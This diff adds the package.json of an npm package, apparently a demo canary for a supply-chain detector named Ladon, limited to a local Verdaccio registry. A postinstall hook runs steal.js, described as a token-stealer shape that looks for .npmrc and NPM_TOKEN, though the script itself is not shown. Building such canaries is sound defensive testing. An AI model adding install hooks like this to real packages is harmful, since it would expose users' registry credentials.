@@ -1,0 +1,16 @@
+{
+  "name": "ladon-canary-tokens",
+  "version": "1.0.0",
+  "description": "LADON DEMO CANARY — harmless. token stealer shape: looks for .npmrc and NPM_TOKEN. Local Verdaccio only.",
+  "main": "index.js",
+  "license": "MIT",
+  "scripts": {
+    "postinstall": "node steal.js"
+  },
+  "publishConfig": {
+    "registry": "http://localhost:4873/"
+  },
+  "ladonCanary": {
+    "attack": "token stealer shape: looks for .npmrc and NPM_TOKEN"
+  }
+}
